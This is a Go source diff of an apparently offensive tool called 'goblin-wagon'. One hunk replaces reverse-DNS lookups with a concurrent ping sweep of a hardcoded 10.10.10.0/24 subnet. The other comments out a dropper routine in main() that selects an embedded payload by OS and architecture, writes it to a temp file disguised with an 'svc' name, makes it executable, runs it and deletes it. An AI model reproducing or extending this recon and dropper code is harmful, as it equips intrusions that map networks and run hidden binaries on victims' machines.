@@ -30,37 +30,36 @@ func is_only_letters(s string) bool {
 	return true
 }
 
-func reverse_lookup_hosts(subnet string) []string {
+func discover_hosts(subnet string) []string {
     var (
-        found []string
+        alive []string
         mu    sync.Mutex
         wg    sync.WaitGroup
     )
- 
-    sem := make(chan struct{}, 20) // 20 concurrent lookups
 
     for i := 1; i < 255; i++ {
+        ip := fmt.Sprintf("%s.%d", subnet, i)
         wg.Add(1)
-        go func(i int) {
+        go func(target string) {
             defer wg.Done()
-            sem <- struct{}{}
-            defer func() { <-sem }()
 
-            ip := fmt.Sprintf("%s.%d", subnet, i)
-            _, err := net.LookupAddr(ip)
+            // send 3 pings, need all 3 to respond
+            cmd := exec.Command("ping", "-c", "3", "-W", "1", target)
+            if runtime.GOOS == "windows" {
+                cmd = exec.Command("ping", "-n", "3", "-w", "1000", target)
+            }
 
-            if err != nil { 
-				return 
-			}
-
-			mu.Lock()
-			found = append(found, ip)
-			mu.Unlock()
-        }(i)
+            if err := cmd.Run(); err == nil {
+                log.Printf("[+] host alive: %s", target)
+                mu.Lock()
+                alive = append(alive, target)
+                mu.Unlock()
+            }
+        }(ip)
     }
 
     wg.Wait()
-    return found
+    return alive
 }
 
 
@@ -202,76 +201,77 @@ var payload_windows_386 []byte
 var payload_windows_arm64 []byte
 
 func main() {
-    log.SetFlags(log.Ltime | log.Lshortfile)
-    log.Println("[*] goblin-wagon starting")
+	discover_hosts("10.10.10")
+    // log.SetFlags(log.Ltime | log.Lshortfile)
+    // log.Println("[*] goblin-wagon starting")
 
-    host_os := runtime.GOOS
-    arch    := runtime.GOARCH
+    // host_os := runtime.GOOS
+    // arch    := runtime.GOARCH
 
-    log.Printf("[*] detected OS: %s | Arch: %s", host_os, arch)
+    // log.Printf("[*] detected OS: %s | Arch: %s", host_os, arch)
 
-    payloads := map[Platform][]byte{
-        {OS: "linux",   Arch: "amd64"}: payload_linux_amd64,
-        {OS: "linux",   Arch: "386"}:   payload_linux_386,
-        {OS: "linux",   Arch: "arm64"}: payload_linux_arm64,
-        {OS: "windows", Arch: "amd64"}: payload_windows_amd64,
-        {OS: "windows", Arch: "386"}:   payload_windows_386,
-        {OS: "windows", Arch: "arm64"}: payload_windows_arm64,
-    }
+    // payloads := map[Platform][]byte{
+    //     {OS: "linux",   Arch: "amd64"}: payload_linux_amd64,
+    //     {OS: "linux",   Arch: "386"}:   payload_linux_386,
+    //     {OS: "linux",   Arch: "arm64"}: payload_linux_arm64,
+    //     {OS: "windows", Arch: "amd64"}: payload_windows_amd64,
+    //     {OS: "windows", Arch: "386"}:   payload_windows_386,
+    //     {OS: "windows", Arch: "arm64"}: payload_windows_arm64,
+    // }
 
-    key := Platform{OS: host_os, Arch: arch}
-    log.Printf("[*] looking up platform key: %+v", key)
+    // key := Platform{OS: host_os, Arch: arch}
+    // log.Printf("[*] looking up platform key: %+v", key)
 
-    data, ok := payloads[key]
-    if !ok {
-        log.Printf("[-] no payload matched for OS=%s Arch=%s -- bailing", host_os, arch)
-        return
-    }
-    log.Printf("[+] payload found, size: %d bytes", len(data))
+    // data, ok := payloads[key]
+    // if !ok {
+    //     log.Printf("[-] no payload matched for OS=%s Arch=%s -- bailing", host_os, arch)
+    //     return
+    // }
+    // log.Printf("[+] payload found, size: %d bytes", len(data))
 
-    ext := ""
-    if host_os == "windows" {
-        ext = ".exe"
-    }
+    // ext := ""
+    // if host_os == "windows" {
+    //     ext = ".exe"
+    // }
 
-    tmp, err := os.CreateTemp("", "svc*"+ext)
-    if err != nil {
-        log.Printf("[-] failed to create temp file: %v", err)
-        return
-    }
-    log.Printf("[*] temp file created: %s", tmp.Name())
+    // tmp, err := os.CreateTemp("", "svc*"+ext)
+    // if err != nil {
+    //     log.Printf("[-] failed to create temp file: %v", err)
+    //     return
+    // }
+    // log.Printf("[*] temp file created: %s", tmp.Name())
 
-    n, err := tmp.Write(data)
-    if err != nil {
-        log.Printf("[-] failed to write payload to temp file: %v", err)
-        return
-    }
-    log.Printf("[+] wrote %d bytes to temp file", n)
-    tmp.Close()
+    // n, err := tmp.Write(data)
+    // if err != nil {
+    //     log.Printf("[-] failed to write payload to temp file: %v", err)
+    //     return
+    // }
+    // log.Printf("[+] wrote %d bytes to temp file", n)
+    // tmp.Close()
 
-    if err := os.Chmod(tmp.Name(), 0700); err != nil {
-        log.Printf("[-] chmod failed: %v", err)
-        return
-    }
-    log.Printf("[*] chmod 0700 applied")
+    // if err := os.Chmod(tmp.Name(), 0700); err != nil {
+    //     log.Printf("[-] chmod failed: %v", err)
+    //     return
+    // }
+    // log.Printf("[*] chmod 0700 applied")
 
-    cmd := exec.Command(tmp.Name())
-    cmd.Stdout = os.Stdout  // pipe output so you can see what wagon.go is doing
-    cmd.Stderr = os.Stderr
-    log.Printf("[*] executing payload: %s", tmp.Name())
+    // cmd := exec.Command(tmp.Name())
+    // cmd.Stdout = os.Stdout  // pipe output so you can see what wagon.go is doing
+    // cmd.Stderr = os.Stderr
+    // log.Printf("[*] executing payload: %s", tmp.Name())
 
-    if err := cmd.Run(); err != nil {
-        log.Printf("[-] payload execution failed: %v", err)
-    } else {
-        log.Printf("[+] payload exited cleanly")
-    }
+    // if err := cmd.Run(); err != nil {
+    //     log.Printf("[-] payload execution failed: %v", err)
+    // } else {
+    //     log.Printf("[+] payload exited cleanly")
+    // }
 
-    if err := os.Remove(tmp.Name()); err != nil {
-        log.Printf("[-] failed to remove temp file: %v", err)
-    } else {
-        log.Printf("[*] temp file cleaned up")
-    }
+    // if err := os.Remove(tmp.Name()); err != nil {
+    //     log.Printf("[-] failed to remove temp file: %v", err)
+    // } else {
+    //     log.Printf("[*] temp file cleaned up")
+    // }
 
-    log.Println("[*] goblin-wagon done")
+    // log.Println("[*] goblin-wagon done")
 }
 	
